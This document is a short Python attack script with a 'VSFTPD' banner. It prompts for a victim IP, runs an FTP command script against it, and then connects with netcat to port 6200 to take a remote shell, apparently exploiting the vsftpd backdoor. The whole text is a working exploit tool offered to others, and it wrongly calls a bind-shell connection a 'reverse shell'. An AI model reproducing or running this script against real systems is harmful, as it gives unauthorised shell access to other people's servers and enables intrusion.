#Made by chleba124
#skids plz atleast credit :D
import os
import time
from colorama import Fore, Back, Style
from pystyle import Colors, Colorate, Write

banner = """
██╗   ██╗███████╗███████╗████████╗██████╗ ██████╗ 
██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
██║   ██║███████╗█████╗     ██║   ██████╔╝██║  ██║
╚██╗ ██╔╝╚════██║██╔══╝     ██║   ██╔═══╝ ██║  ██║
 ╚████╔╝ ███████║██║        ██║   ██║     ██████╔╝
  ╚═══╝  ╚══════╝╚═╝        ╚═╝   ╚═╝     ╚═════╝ 
"""

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
clear()
print(Colorate.Horizontal(Colors.blue_to_cyan, banner, 1))
print()
victim_ip = Write.Input("Victim IP -> ", Colors.red_to_purple, interval=0.0025)
payload = "start /min ftp -s:cmd.txt " + str(victim_ip)
shell_payload = "nc " + str(victim_ip) + " 6200"
print(Fore.RED + '[!] - Opening reverse shell.')
os.system(payload)
time.sleep(2)
print(Style.RESET_ALL)
os.system(shell_payload)
